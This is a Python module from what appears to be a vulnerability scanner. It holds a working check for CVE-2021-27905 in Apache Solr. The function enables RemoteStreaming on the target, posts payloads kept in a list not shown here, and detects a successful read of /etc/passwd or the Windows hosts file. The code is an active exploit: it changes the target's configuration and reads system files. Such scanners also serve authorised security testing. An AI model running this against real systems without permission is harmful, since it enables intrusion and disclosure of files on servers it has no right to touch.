#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2021_27905_scan(self, url):
    ''' 当Solr不启用身份验证时, 攻击者可以直接制造请求以启用特定配置, 最终导致SSRF或任意文件读取 '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'SSRF/FileRead'
    vul_info['vul_id'] = 'CVE-2021-27905'
    vul_info['vul_method'] = 'GET/POST'
    vul_info['headers'] = {
        'Content-Type': 'application/json'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])             # * 合并Headers

    self.enable(url)                                # * 开启Solr的RemoteStreaming
    if not self.RemoteStreaming:
        return None

    for payload in self.cve_2021_27905_payloads:    # * Payload
        path = payload['path'].format(self.db_name) # * Path
        data = payload['data']                      # * Data
        target = url + path                         # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=self.headers, 
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                       # * LOG


            # todo 判断
            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
